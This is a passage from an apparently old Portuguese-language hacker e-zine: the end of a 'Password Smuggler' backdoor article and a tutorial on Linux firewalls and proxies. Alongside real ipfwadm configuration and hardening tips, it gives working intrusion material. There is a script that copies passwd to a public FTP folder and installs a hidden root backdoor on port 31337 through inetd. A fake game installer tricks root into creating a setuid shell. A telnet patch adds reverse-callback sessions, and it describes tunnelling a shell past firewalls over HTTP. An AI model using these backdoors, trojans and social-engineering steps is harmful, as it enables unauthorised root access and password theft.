+  cp /tmp/.expose /home/ftp/incoming/.p9/passwd.expose
+  rm /tmp/.expose
+  echo "Fim..."
+  logout
+  [Password Smuggler]
+
+  Agora, vai o script de instalacao do bichano =)
+
+  [password smuggler instalation system]
+  #!/bin/sh
+  echo "Password smuggler instalation systems."
+  echo "[c] a Phone9 31337 production."
+  echo
+  echo "Instalando o Password Smuggler... Aguarde!!!"
+  echo "psmug stream tcp nowait root /usr/sbin/.psmug" >> /etc/inetd.conf
+  echo "psmug            31337/tcp " >> /etc/inetd.conf
+  echo
+  echo "Agora, e' so' colocar o arquivo psmug (Phone9-02.) Que voce podera"
+  echo "executar a backdoor... Coloque-o no diretorio /usr/sbin/,  sobre o"
+  echo "o nome de .psmug, assim apenas um telnet na porta: 31337  e pronto" 
+  echo
+  echo "Password Smuggler Instalation systems."
+  echo "[c] a Phone9 31337 Productions."
+  [password smuggler instalation system]
+
+Obs. Queremos dizer que nos estamos trabalhando o Sniffer para conexoes a
+     rede dial-up, do resto... b0gnw3ng, Dudah!!  
+
+contact: [blood@webcrunchers.com]|[Password Smuggler Project]
+31337/udp -> Back Orifice,
+31337/tcp -> Passwd Smug, >:-)
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³20 - Firewall e proxy em sistemas linux, nocoes basicas		       ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by bloodroot ³°°
+	  	  						          ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+			     r00t d0wn k0mmunications
+    
+				     presents...
+
+		      .[Firewall e Proxy em sistemas linux].
+		    .[ by The bloodroot :. blood@phone9.org ].
+
+Durante anos em que eu vivi entrando e saindo de redes, eu percebi que uma
+das maiores armas de uma rede, tanto intranet quanto internet, e' o firewall
+um programa que roda no seu sistema, monitorando cada pequeno grao de pacote
+transmitido pela sua rede. O firewall e' muito comum em sistemas de empresas
+e alguns servidores, com ele se e' possivel controlar todo o tipo de conexao
+com a sua rede, podendo vetar qualquer conexao suspeita, em geral e' uma 
+grande arma na hora de implementar a sua seguranca. 
+
+Mas poucos sabem como utiliza-las, desde usuarios de windows95/98, ate' o 
+infame linux , alvo do texto, ate hoje eu me deparo com usuario que reclamam
+da seguranca do seu sistema, sem ao menos saber se uma conexao esta sendo
+pedida ou nao, em outras palavras e' como atirar no escuro, voce imagina que
+alguma conexao misteriosa vem vindo por UDP diretorio para a sua rede, e 
+esta disposta a conseguir root??? Nao, a nao ser que voce tenha consultado
+o "Sr. Ligue Ja'", e seu videntes... ;) Por isso em qualquer sistema 
+operacional, ate' mesmo DOS, e' necessario se acrescentar um firewall para
+voce poder dizer com seguranca "Ja' parei 80% dos hackers...". 
+
+O objetivo deste texto e' ensinar a voce a como colocar um firewall na sua
+rede linux e ainda como invadi-lo depois de algumas tentativas sem sucesso.
+
+Obs: Eu , o autor do texto tomo responsabilidade por qualquer falha que este
+texto eventualmente possa trazer, se alguma pessoa tiver a habilidade de 
+conseguir fazer uma "cagada" com as tecnicas aqui investidas, voces podem 
+levar um papo com papai e mamae ;)
+
+
+Firewall e' um sistema de protecao de portas, monitorando cada conexao feita
+para as portas ou protocolos, designados pelo admin para monitorar, o papel
+deles e' apenas observar e alertar o admin de qualquer conexao de fora para
+dentro, perguntando a respostas do admin para ver se ele devera liberar ou
+nao a conexao pendente. Lembre-se que o firewall pode negar qualquer conexao
+pendente sem nenhum problema. Obviamente que o firewall nao e' uma ferramen-
+ta tao burra, ele tem pode monitorar e parar o acesso de dentro para fora,
+nao permitindo que usuarios da rede, possam se comunicar com o lado de fora
+da rede (internet?), para que de dentro para fora seja permitida e' necessa-
+rio que o usuario tenha a permissao do administrador, e ainda por cima, tem
+que originar uma secao por meio de telnet, ou por meio de outra conexao que
+o firewall permita, por exemplo PPP, slip, dial-up, ou outro meio.
+
+A forma mais simples de um firewall e' o firewall "caseiro". Sendo instalado
+ou no seu windows ou no seu linux (unix-br0thers!!!), monitorando todas as
+conexoes a somente o seu IP, nao tendo total controle sobre qualquer usuario
+que tenha sua conexao originada por meio outro IP. Mas um firewall bem confi
+gurado, como o descrito aqui, pode designar os servicos, e unicas funcoes 
+que a conta pode executar na shell e no sistema como uma parte inteira. 
+
+No caso de proxys, o firewall pode ser acessado por meio de um servidor 
+remoto, que depois da aprovacao do firewall permite que o usuario se conecte
+remotamente com o servidor, inibindo o acesso de outros usuarios pelo mesmo
+login, por que alem da autentificacao do admin e do firewall, tambem existe
+o problema do login, que impede a maioria dos raquers que existem por ai.
+Praticamente a cada dia sao lancados programas como estes, permitindo uma
+conexao amigavel entre o cliente e o servidor.
+
+Existem basicamente dois tipos firewalls:
+
+1:. O IP ou Firewall Filtering - Que bloqueia o acesso de todos os servicos
+fora os designados pelo admin.
+
+2:. Proxy Server - Faz uma conexao direta com o servidor direto da sua casa,
+ou escrito, obviamente passando pela devida autenficacao do cliente.
+
+
+
+IP firewall Filtering - Bloqueando conexao nao desejadas
+-- -------- ---------   ---------- ------- --- ---------
+
+Um IP filtering funciona a nivel de pacotes enviados ao host onde o firewall
+esta rodando. Este examina, o tamanho, conteudo, destino, porta, remetente e
+o tipo informacao contida dentro dos pacotes.
+Embora um tanto seguro, ele nao e' tao seguro quanto outros sistemas de 
+protecao, ele entra em uma politica de que todas as informacoes publicas, 
+nao precisam de seguranca, por tanto ele nao grava quem acessa os dados 
+publicos do seu sistema, somente os privados. E ainda nao mantem controle 
+sobre nenhum dos acessos originados de dentro da rede.
+Embora seja uma boa tecnica, ela so protege sistema unico de IP, ou seja ,
+se eu tenho um IP filtering no meu sistema e eu quero dar acesso a alguem de
+fora no meu servidor, e' necessario que eu habilite para todos aquela area 
+do servidor para todos, sem restrincao e sem nenhum tipo de log, vindo por
+meio do firewall, por isso este tipo de firewall so e' eficiente quando e' 
+utilizado em redes de somente um usuario, por exemplo o seu linux no seu 
+quatrooitomeia!!! O linux ja' vem com este tipo de firewall desde a versao
+da kernel 1.3.x , o programa e' IPADMF (IPadministratorFirewall)
+
+Proxy Servers - Conectando a sua rede na sua casa
+----- -------   ---------- - --- ---- -- --- ----
+
+Proxy servers, permitem que conexoes indiretas a internet sejam originadas
+por meio do firewall, tendo um administrador, monitorando e barrando a entra
+da de certos pacotes. Um exemplo seria, se uma pessao desse um telnet em um
+sistema e em seguida originasse outra conexao por meio de telnet. Normalmen-
+te o proxy server, utiliza um sistema de cliente e software, para se 
+conectar com a 'rede'. Como por meio de um proxy a conexao para a rede, so
+pode ser efetuada pela rede, entao e' possivel se controlar todo tipo de 
+transacao no seu sistema. 
+
+
+Configurando firewall no seu sistema linux
+------------ -------- -- --- ------- -----
+
+necessidades do sistema: 486 dx4, 500 megabytes de particao do linux, 16mg
+livres de hd.
+
+No minino a sua rede devara ter dois IPs, considerando que voce ira instalar
+o firewall em uma rede, no caso de instalacao de firewall em um sistema 
+local e unico, e' nencessario se instalar um sistema linux, por exemplo o 
+red hat ou slackwares, pois ambos vem com uma kernel que suporta a 
+instalacao de softwares como firewall no sistema.
+
+
+Os programas de firewalls sao muito conhecidos, no exemplo do linux, existem
+varios, desde de o freeware IPFWADM, e' sempre bom lembrar que se nenhum
+daemon TCP/IP/UDP for instalado a existencia de um firewall e' inutil pois
+qualquer servico remoto nao pode ser efetuado. Outro grande firewall e' 
+TIS, Firewall Tool Kit, FWTK, com uma grande estrategica de protecao, nao e'
+tao diferente do seu primo renegado, SOCKS, que tem basicamente as mesmas
+funcoes, neste caso nos iremos cobrir a instalacao dos dois tipos de package
+
+
+:> Compilando a Kernel <:
+-- ---------- - ------ --
+
+Para que tudo ocorra com a maior natureza, instale uma versao de linux no
+seu computador, delete a antiga se existir, pois voce ja' pode ter mexido na
+kernel ou em alguns configs que podem alterar o processo de intalacao dos 
+firewalls. A versao 3.0.3 do linux Red Hat e' usada como padrao neste texto.
+Use uma kernel instavel, algo como... 2.0.14, ou 2.0.3, sei la' te vira ;)
+
+Voce tera que recompilar a sua kernel para incluir as informacoes novas na
+sua kernel, primeiro digite:
+
+ph0ne9:/root/> make config
+
+E faca as seguitne altecoes na sua kernel:
+
+- Sob a configuracao geral do setup
+- Ligue a opcao de suporte a rede [On]
+- Sob a configuracao de networks
+- Ligue a opcao de firewall [On]
+- Ligue a opcao de rede TCP/IP [On]
+- Desligue a opcao IP forwarding/gateway , a nao ser que voce saiba o que 
+  esteja fazendo. [OFF]
+- Ligue a opcao de IP firewall [On]
+- Ligue a opcao de loggin de pacotes de IP [On]
+- Desligue a opcao de IP masquerading, pode ser um tanto problematica na 
+  hora de setupar filtros de IP. [OFF]
+- Ligue a opcao de IP accounting [On]
+- Desligue a opcao: IP tunneling [OFF]
+- Desligue a opcao de alising de IP [OFF]
+- Desligue o modo de compatibilidade de PC/TCP [OFF]
+- Desligue o modo de reversao de ARPs [OFF]
+- Ligue a opcao de mostrar source routeadores e IPs [On]
+- Sob a configuracao do dispositivo de rede
+- Ligue o suporte de dispositivos para rede [On]
+- Ligue o suporte para terminal burro [On]
+- Ligue a sua rede ethernet (10 ou 1000Mbit) [On]
+- Selecione o seu tipo de cartao de rede.
+
+Agora voce pode sair, recompilar e rebootar a sua maquina, se o cartao de
+rede nao aparecer no seu setup, entao voce tera que fazer tudo denovo ate' 
+tudo funcionar direito.
+
+
+Para configurar os seus cartoes de redes e' necessario que voce edit o 
+arquivo etc/lilo.conf, para descrever a porta IRQ e o enderecos dos cartoes
+de rede (caso voce obviamente for usar rede, dah!!! ;)), voce devera mudar
+os enderecos desta linha abaixo:
+
+append="ether=12,0x300,eth0 ether=15,0x340,eth1"
+
+Para configurar o seu endereco de rede, agora e'necessario fazer algumas 
+decisoes sobre a rede, como por exemplo: Se as areas privadas terao acesso
+a internet ou nao, politica de tratamento de rros, entre outras coisas 
+chatas por ai. Uma boa opcao para os seus enderecos privados, e' colocar 
+qualquer endereco falso, pois como aquele IPs nao precisarao se conectar na
+internet, entao e' como nenhum deles passara por algum tipo de roteador ou
+qualquer verificador de autenticidade na internet, eles sao uma pedida para
+qualquer rede ;)
+
+Os IPs que nos iremos usar serao o seguinte: 200.255.185.xxx 
+Como o seu proxy sera membro das duas areas da sua rede, a privada e a 
+publica, para que ele possa passar de um lado para o outro sem problemas. 
+A esquematizacao do proxy server ficaria mais ou menos assim:
+
+                       ||
+	200.255.185.000  ||  200.255.185.001
+		\||/       ||        \||/
+	-----------------||------------------
+	/\/\/\/\/\/\- firewall -/\/\/\/\/\/\
+	|Rede privada|   ||      | Internet|
+	`------------'   ||      `---------'
+			     ||
+
+A rede no caso, tem dois IPs, 200.255.185.000, que e' o IP falso, utilizada
+para a rede privada, e o IP 200.255.185.001, utilizada para a internet, ou
+conexoes publicas, como gerenciamento de clientes entre outras utilidades.
+O firewall fica como um filtro em todas as redes, publicas ou privadas,dando
+maior seguranca para todos os pacotes que a rede, efetivamente pode originar
+ou receber. 
+
+Testando a sua rede, comece testando a sua rede pelo ifconfig, e pelo route,
+Se voce tiver dois tipos de cartoes de rede, o seu ifconfig devera ser algo
+mais ou menos assim:
+
+%ifconfig
+lo Link encap:Local Loopback
+inet addr:127.0.0.0 Bcast:200.255.185.000 Mask:255.0.0.0
+UP BROADCAST LOOPBACK RUNNING MTU:3584 Metric:1
+RX packets:1620 errors:0 dropped:0 overruns:0
+TX packets:1620 errors:0 dropped:0 overruns:0
+
+eth0 Link encap:10Mbps Ethernet HWaddr 00:00:09:85:AC:55
+inet addr:200.255.185.001 Bcast:200.255.185.000 Mask:255.255.255.0
+UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
+RX packets:0 errors:0 dropped:0 overruns:0
+TX packets:0 errors:0 dropped:0 overruns:0
+Interrupt:12 Base address:0x310
+
+eth1 Link encap:10Mbps Ethernet HWaddr 00:00:09:80:1E:D7
+inet addr:200.255.185.000 Bcast:200.255.185.001 Mask:255.255.255.0
+UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
+RX packets:0 errors:0 dropped:0 overruns:0
+TX packets:0 errors:0 dropped:0 overruns:0
+Interrupt:15 Base address:0x350
+
+e a sua route table devera ser assim:
+
+%route -n
+Kernel routing table
+Destination Gateway Genmask Flags MSS Window Use Iface
+199.1.2.0 * 255.255.255.0 U 1500 0 15 eth0
+192.168.2.0 * 255.255.255.0 U 1500 0 0 eth1
+127.0.0.0 * 255.0.0.0 U 3584 0 2 lo
+default 199.1.2.10 * UG 1500 0 72 eth0
+
+Agora teste o seu ping contra a rede publica, o ping devera ser alertado
+pelos logs do firewall, caso contrario ou o seu firewall esta mal 
+configurado ou entao o seu PP esta tambem mal configurado. 
+
+
+E' claro que eu nao podia me esquecer de pequenas tecnicas de como se ter um
+firewall o mais seguro possivel...
+
+Para que a integridade do firewall seja possivel, e' necessario se desligar
+todos os servicos que voce nao roda.... cat /etc/inetd.conf, devera te 
+mostrar o que roda e o que nao, depois apenas comente (#) os servicos que
+voce nao deseja. E' claro que servicos como finger, tftp, bootp, netstat,
+systat, devem ser desligados pois nao tem nenhum sentido deixa-los rodando,
+a nao ser que a sua rede precise deles. ao acabar de configurar de um sinal
+-HUP no seu inetd para que ele re-liea as novas configuracoes setupadas por
+voce. E' claro que por ser um firewall todo o sistema de seguranca interna
+dele ja' vem setado de um jeito ou de outro, nos somente ajudamos, por isso
+nao existem muitas tecnicas de como se setupar seguramente um firewall...
+
+
+
+
+Internet Protocol FireWall Admin:
+^^^^^^^^ ^^^^^^^^ ^^^^^^^^ ^^^^^^ 
+
+Para que este rode, e' necessario que voce tenha a sua opcao IP forwarding
+ligada, assim sera possivel rodar o IPFWADM. Seria esperto colocar algumas
+configuracoes no seu sistema, por meio do /etc/rc.d, pois este podem 
+configurar qualquer politica de seguranca do seu firewall durante o boot do
+seu sistema, e nao depois por meio de um processo manual...
+
+Para comecar e' sempre bom colocar o seu firewall rodando em uma opcao de
+negacao de qualquer tipo de conexao para a sua maquina, e desligando as 
+configuracoes que foram setupadas para o ipfwadm, na ultima vez que foi 
+inicializado, para isto crie este script:
+
+#!/bin/sh
+#
+#setupando o seu ipfwadm desde o inicio
+#
+#Negando acesso a sua maquina
+ipfwadm -F -p deny
+# Desligando todos os comandos...
+ipfwadm -F -f
+ipfwadm -I -f
+ipfwadm -O -f
+
+Entao agora entra em acao a opcao de forwarding IP, fazendo com que somente
+algumas funcoes do seu IP sejam passada pelo firewall, abaixo vao alguns 
+exemplos:
+
+#dando um forward no mail
+ipfwadm -F -a accept -b -P tcp -S 0.0.0.0/0 1024:65535 -D 200.255.185.001 25
+
+#dando um forward para conexoes no seu mail , para algum servidor externo
+ipfwadm -F -a accept -b -P tcp -S 200.255.185.001 -D 0.0.0.0/0 1024:65535
+
+#Dando um forward em conexoes para o servidor http
+ipfwadm -F -a accept -b -P tcp -S 0.0.0.0/0 1024:65535 -D 200.255.185.001 80
+
+#Dando um forward para uma conexao no seu web server para outro webserver
+ipfwadm -F -a accept -b -P tcp -S 200.255.185.* 80 -D 0.0.0.0/0 1024:65535
+
+#dando um forward no trafego de DNS
+ipfwadm -F -a accept -b -P udp -S 0.0.0.0/0 53 -D 200.255.185.001/24 
+
+Se voce estiver interessado, recentemente eu lancei um script que se aplica
+muito a interface do ipfwadm, pois pega as funcoes mais usadas deles e as
+simplifica de modo facil, sem todo aquele sofrimento de escrever todos os 
+comandos. mailto: blood@phone9.org que eu lhe mando o script...
+
+Agora um script que registrar todos os pacotes vindos da sua rede, este
+script ira contar e registrar cada pacote que sair do seu firewall, sinta-se
+livre para alterar o script:
+
+# Apaga os comandos ja' escritos
+ipfwadm -A -f
+# Accountin' tha system, Jackass
+/sbin/ipfwadm -A -f
+/sbin/ipfwadm -A out -i -S 200.255.185.001/24 -D 0.0.0.0/0
+/sbin/ipfwadm -A out -i -S 0.0.0.0/0 -D 200.255.185.001/24
+/sbin/ipfwadm -A in -i -S 200.255.185.001/24 -D 0.0.0.0/0
+/sbin/ipfwadm -A in -i -S 0.0.0.0/0 -D 200.255.185.001/24
+
+Obs: Lembrem-se que todos os enderecos IPs, estao em formato 0.0.0.0 pois 
+estes deverao ser o IP para qual sera dado o forward, ou sobre que outro
+IP fora o seu sera aplicado o comando. Em outras palavras, Nao e' o seu IP!
+
+
+
+Agora que voce ja' tem uma base (bem basica), em como funcionam os firewalls
+e como se instala um deles e ainda, como colocar a melhor utiliza-las, agora
+eu explico uma tecnica criada por Van Hauser da The Hackers Choice, bom 
+amigo de acidmud???? ;))  Esta tecnica insiste em colocar uma backdoor por
+tras do firewall, por meio de um bug descoberto por ele...
+
+Bom, uma vez que voce obteve uma senha dentro do sistema onde roda o 
+firewall, voce percebe que as seguintes configuracoes do firewall estao 
+assim:
+
+- Os usuarios internos podem acessar somente o servico www da internet.
+
+Entao, voce apos conseguir a senha, deixa rodando o programa abaixo, este
+programa faz um spawns em um dos usuarios do sistema (oque voce conseguiu a
+senha), para o firewall este usuario e'apenas um usuarios que esta usando os
+servicos liberados pelo administrador, por exemplo WWW. Mas o unico problema
+e' que este usuario que todo o dia/mes/ano/hora, execute o seu netscape e se
+conecta a um host por meio de um servidor web, caindo em uma shell, 
+executando comandos em uma shell local, e se conecta no servidor do qual o 
+hacker que um dia invadiu o firewall desfrutou. O que para o firewall parece
+ser apenas uma inocente conexao WWW para uma pagina qualquer, esta na reali-
+dade executando comandos atravez de uma shell local, como por exemplo:
+% passwd 0wn3d
+Assim , todo o dia que o programa backdoor e' executado, ele finge se 
+conectar a um servidor de um hacker, quando esta executando comandos na sua
+propria shell, sem que o firewall reconheca a utilizacao da shell, pois para
+o firewall o usuario esta acessando somente a sua internet http. Todos as
+chamadas de processos serao mudadas para valores de strings-CGI, por exemplo
+
+fucker->
+GET /cgi-bin/order?M5mAejTgZdgYOdgIO0BqFfVYTgjFLdgxEdb1He7krjVAEfg HTTP/1.0
+
+fucking responde ->
+g5mAlfbknz
+
+Assim qualquer possibilidade de logs ou de processos de cacheamento de qual-
+quer pagina ja' visitada , nao ira entregar a verdadeira face do backdoor.
+Para o firewall o GET so quer dizer que o usuario acessou um cgi, e catou
+algum arquivo, para a backdoor, e para o servidor www do hackers, o usuario
+do qual a backdoor esta sendo originado, apenas esta executando ls no seu
+diretorio dentro do servidor local, na sua shell local. 
+
+Agora, quando voce conseguir um usuario por traz de qualquer firewall, somen
+te execute este firewall que todos os seus problemas nao se acabarao, mas
+concerteza serao bem mais faceis de serem resolvidos.
+
+
+Outra tecnica de invasao e' a pesquisa de servicos, um simples port scan ira
+resolver isto, passe um port scan no host que ira ser atacado, depois de um
+port skan bem sucedido, veja as portas abertas... www sao vulneraveis ao
+explicado acima, rwwwshell.pl, ftp sao vulneraveis a bugs do tipo overflow, 
+estes colocam um arquivo que da um crash no seu netscape, podendo depois de
+muito tempo executar um comando remotamente pelo client netscape crashado!!!
+
+Esta e' uma das melhores, se o servidor nao tiver setupado a opcao de ver os
+sources dos IPs, entao e' possivel se dar um hijjack nas conexoes, prevendo
+os codigos de conexao do handshake, entao e' possivel se infiltrar na rede,
+por meio um pacote com um conteudo um tanto esquizito como "/bin/sh -i",
+quem sabe???
+
+
+-- Monitorando o firewall da sua casa.
+
+Entao voce trabalha em uma grande rede, que tem um firewall, voce sempre 
+pede para o b0fh do sysop para te dar uma senha que tenha algum status eleva
+do, mas ele sempre te diz nao... Entao o que voce faz? Vai chorando para a 
+casa, voce e' bicha? Nao, voce le abaixo e aprende a como deixar o seu sysop
+louco e arrependido por nao ter colocado o IP-tunneling...
+
+Entao, voce primeiro ira no seu trabalho e dara um disquete com este script,
+para rodar um joguinho no seu sistema... Peca para que o root instale-o em 
+como set-uid, para que voce possa executar todas as bibliotecas que o jogo
+precisa:
+-- gwk.sh --
+#!/bin/sh
+#
+echo "Welcome to Global Warrior killer v10"
+echo "by Dinas0ft global, Inc."
+echo
+echo "Installing the GWK v10!!!"
+echo "Waiting..."
+/bin/cp /bin/sh /tmp/.x
+chmod a+x /tmp/.x
+echo "We've got some major problems while installing the game..."
+echo "Please contact our on-line call-f0r-help"
+exit 0
+-- gwk.sh --
+
+Coloque dentro do package do jogo, alguns arquivos .zip, pode catar os 
+binarios que ai o administrador nao ficara procurando por comandos estranhos
+
+Agora e' so voce se sentar no seu computador e executar a shell /tmp/.x, 
+ja' faca varias copias da shell para outros locais... Agora pegue o codigo
+do daemon icmpd, compile-o e deixe-o rodando no /etc/inetd.conf.
+Agora, voce precisa se conectar na internet com o seu linux, e rodar este
+codigo abaixo, este ira se disfacar de ping, quando na verdade estara se 
+comunicando com o icmpd... O ring esta dentro do arquivo fwhack.tar, junto
+com o daemon e os outros arquivos...
+
+O que o programa faz e', ao receber uma conexao vinda do seu host, o icmpd,
+ira fazer um sistema reverso de telnetin', fazendo com que voce caia em um
+prompt de login, o que para o firewall ficara parecendo que voce apenas 
+tenha aberto outro terminal local para se logar...
+
+O patch para este bug esta abaixo:
+-- Patch --
+diff -urN telnet/commands.cc telnet.sneakin/commands.cc
+--- telnet/commands.cc	Fri Aug 16 23:34:57 1996
++++ telnet.sneakin/commands.cc	Sat Jun  7 16:50:11 1997
+@@ -99,6 +99,7 @@
+ 
+ static unsigned long sourceroute(char *arg, char **cpp, int *lenp);
+ 
++extern char callbackmode;
+ 
+ char	*hostname;
+ static char _hostname[MAXHOSTNAMELEN];
+@@ -1542,7 +1543,8 @@
+  */
+ static int dostatus(int notmuch) {
+     if (connected) {
+-	printf("Connected to %s.\n", hostname);
++	if (!callbackmode) printf("Connected to %s.\n", hostname);
++	else printf("Connected\n");    
+ 	if (!notmuch) {
+ 	    int mode = getconnmode();
+ 
+@@ -1628,7 +1630,7 @@
+     const char *cmd, *volatile user = 0;
+     const char *portp = NULL;
+     char *hostp = NULL;
+-
++	
+     /* clear the socket address prior to use */
+     memset(&sn, 0, sizeof(sn));
+ 
+@@ -1766,9 +1768,16 @@
+ 	}
+ 	telnetport = 1;
+     }
+-    printf("Trying %s...\n", inet_ntoa(sn.sin_addr));
++    if (!callbackmode)
++	  printf("Trying %s...\n", inet_ntoa(sn.sin_addr));
++	else printf("Waiting on port %d\n", atoi(portp));
++	
+     do {
+-	int x = nlink.connect(debug, host, &sn, srp, srlen, tos);
++	    int x;
++	    
++	    if (callbackmode)
++	      x = nlink.accept(debug, sn.sin_port);
++	    else x = nlink.connect(debug, host, &sn, srp, srlen, tos);
+ 	if (!x) return 0;
+ 	else if (x==1) continue;
+ 	connected++;
+diff -urN telnet/main.cc telnet.sneakin/main.cc
+--- telnet/main.cc	Thu Aug 15 06:18:27 1996
++++ telnet.sneakin/main.cc	Fri Jun  6 22:25:13 1997
+@@ -50,6 +50,8 @@
+ #include "defines.h"
+ #include "proto.h"
+ 
++char callbackmode=0;
++
+ /*
+  * Initialize variables.
+  */
+@@ -78,7 +80,7 @@
+ void usage(void) {
+     fprintf(stderr, "Usage: %s %s%s%s%s\n",
+ 	    prompt,
+-	    "[-8] [-E] [-L] [-a] [-d] [-e char] [-l user] [-n tracefile]",
++	    "[-8] [-w] [-E] [-L] [-a] [-d] [-e char] [-l user] [-n tracefile]"
+ 	    "\n\t",
+ #ifdef TN3270
+ 	    "[-noasynch] [-noasynctty] [-noasyncnet] [-r] [-t transcom]\n\t",
+@@ -119,7 +121,7 @@
+ 	rlogin = (strncmp(prompt, "rlog", 4) == 0) ? '~' : _POSIX_VDISABLE;
+ 	autologin = -1;
+ 
+-	while ((ch = getopt(argc, argv, "8EKLS:X:ade:k:l:n:rt:x")) != EOF) {
++	while ((ch = getopt(argc, argv, "8EKLS:X:ade:k:l:n:rt:xw")) != EOF) {
+ 		switch(ch) {
+ 		case '8':
+ 			eight = 3;	/* binary output and input */
+@@ -202,6 +204,9 @@
+ 			   "%s: Warning: -t ignored, no TN3270 support.\n",
+ 								prompt);
+ #endif
++			break;
++		case 'w':
++			callbackmode = 1;
+ 			break;
+ 		case 'x':
+ 			fprintf(stderr,
+diff -urN telnet/netlink.cc telnet.sneakin/netlink.cc
+--- telnet/netlink.cc	Thu Aug 15 05:54:03 1996
++++ telnet.sneakin/netlink.cc	Fri Jun  6 23:17:20 1997
+@@ -111,6 +111,31 @@
+     }
+     ::close(net);
+ }
++/* added for callback */
++int netlink::accept(int debug,unsigned short port)
++{
++	struct sockaddr_in our,remote;
++	int ls,val=1,size=sizeof(remote);
++	
++	ls = socket(AF_INET, SOCK_STREAM, 0);
++	our.sin_family = AF_INET;
++	our.sin_port = port;
++	our.sin_addr.s_addr = htonl(INADDR_ANY);
++	if (setsockopt(ls,SOL_SOCKET,SO_REUSEADDR,&val,sizeof(long)) < 0) {
++		perror("telnet : setsockopt");
++		return 0;
++	}
++	if ( bind(ls,(struct sockaddr*)&our,sizeof(our)) < 0) {
++		perror("telnet : bind()");
++		return 0;
++	}
++
++	listen(ls,1);
++	
++	net = ::accept(ls,(struct sockaddr*)&remote,&size);
++	
++	return 2;
++}
+ 
+ int netlink::connect(int debug, struct hostent *host, 
+ 		     struct sockaddr_in *sn, 
+diff -urN telnet/netlink.h telnet.sneakin/netlink.h
+--- telnet/netlink.h	Fri Aug  2 11:33:48 1996
++++ telnet.sneakin/netlink.h	Fri Jun  6 21:19:57 1997
+@@ -6,6 +6,7 @@
+     netlink();
+     ~netlink();
+ 
++    int accept(int debug,unsigned short port); 
+     int connect(int debug, struct hostent *host, 
+ 		struct sockaddr_in *sin, 
+ 		const char *srcroute, int srlen,
+
+-- Patch --
+
+
+
+
+
+--- Medidas de seguranca para a sua rede ---
+
+Para aqueles que me chamaram de injusto so dando informacoes para o pessoal
+do blackpapers, ai vai uma pros whitepapers, tecnicas e politicas de 
+protecao do seu firewall.
+
+- Firewall user
+
+Uma das primeiras atitudades a serem tomadas no seu sistema e' a de nao 
+executar o seu firewall por meio de um usuario que seja root, admin, ou 
+outro. Nobody? Razoes para nao usarem o nobody como usuario eu tenho aos
+montes, a) ele ja' esta muito sobrecarregado executando o seu apache, ftp
+server, news entre outros servicos... b) Ele pode ser facilmente persoadido
+por outros programas que tem rodam sobre a uid dele, uma vez conseguido ter
+acesso ao nobody, e' so um passo para desproteger a rede toda do firewall.
+c) eu nao gosto do nobody... mamae falou para nao falar com estranhos ;)
+
+Por isso eu recomendo que o firewall seja rodado por um usuario especial,
+por exemplo: fw, como e' no meu sistema. Tendo o firewall rodado por um 
+unico usuario voce pode rodar o firewall por ele, se as devidas permissoes
+forem feitas no seu sistema. E ainda podem ser adotadas algumas medidas de
+seguranca quanto ao usuario.
+
+negacao de shell: Uma boa tecnica e' a de nao permitir a utilizacao de 
+nenhuma shell por meio do usuario fw, isto e' algo estupido de se fazer:
+fw:x:uid:gid:firewall daeler:/luser/fw:/super/bin/.fw
+
+E o arquivo .fw seria algo assim:
+
+#!/bin/csh
+#
+#.Firewall daeler.
+senha= #Coloque uma senha so para uma segunda seguranca do firewall
+firewall= #coloque o caminho para o seu firewall com todos os flags que
+	    #deverao ser carregados para que ele rode do jeito que voce quer!!
+
+
+echo "Conectando o firewall!!!"
+
+pass:
+echo "Digite sua senha: "
+read pass
+if pass = $senha
+then
+	echo "Bem vindo ao firewall daeler"
+	echo "Executando o seu firewall.. Aguarde!!!"
+	goto fwdlr
+else
+	echo "Senha nao confere com a senha do firewall daeler"
+	echo "Get off, sucker!!!"
+	goto quit1
+fi
+
+quit1:
+echo "Deseja sair?"
+echo "1: saiu!!!"
+echo "2: ficou!!!"
+echo ":> "
+read chc
+case $chc in
+	1) goto quit2 ;;
+	2) goto pass ;;
+esac
+
+quit2:
+echo "Tchau.. Firewall Daeler v1.0"
+echo "by bloodroot - blood@phone9.org"
+echo 
+echo "Better lucky next time... 0kay?"
+exit 0
+/bin/logout
+
+fwdlr:
+echo "Bem vindo ao Firewall Daeler v10"
+echo "by The bloodroot - blood@phone9.org"
+echo
+echo "-- executando seu firewall --"
+$firewall
+
+E' necessario, talvez criar um novo grupo somente para o firewall, fazendo
+com que voces possam ter os seus proprios grupos de arquivos, sem poderem
+interferir em outros grupos... Uma coisa e' basica, nao de mais atributos do
+que o necessario para o seu fw user... Pois este pode ser persoadido e 
+tornar-se em uma fonte de bugs para o seu sistema.
+
+Outra coisa interessante, seria montar um /super/bin/ onde ficariam todos os
+arquivos binarios da galera da uid especial, ou que fazem algo de especial,
+assim sera mais facil controlar o acesso aos arquivos. Isto e' utilizado em
+varios servidores grandes como uol, openlink entre outros... e no meu linux,
+e' claro... hehehe!!!
+
+
+-- Cuidando de problemas do firewall --
+
+Se houvesse um PROCON de reclamacoes sobre firewalls eu acredito que muitos
+iriam reclamar sobre a extensao de um firewall, devido a ma-cofngiruacao de
+muitos firewalls, e' possivel se deixar alguns servicos fora do controle, 
+servicos rodando em portas muito altas para mais de 2000, que podem e sao um
+perigo para certas redes... Para resolver este problema, basta eliminar os
+servicos que voce nao usa, eu quero dizer todos... comente todos fora os que
+voce nao usa... e se algo acontecer de errado, tente resolve-lo sem retirar 
+o comentario do servico. 
+
+Lembrem-se, ninguem e' tao inocente quanto parece, o usuario que nao acessa
+na sua rede, pode ser o usuario que em um simples login detonou com o seu 
+r00t... Entao de atencao para todos... 
+
+---[ Ultimas palavras...
+
+Bom, eu pretendo continuar escrevendo sobre segranca e falhas em firewalls,
+assim que alguns projetos meus e da galera forem liberados eu logo os irei
+implementar para sistemas de firewall com SOCK, TIS firewall Toolkit e 
+IPFWADM, entao aguardem...
+
+Leitura opcional:
+- Read my ass...
+
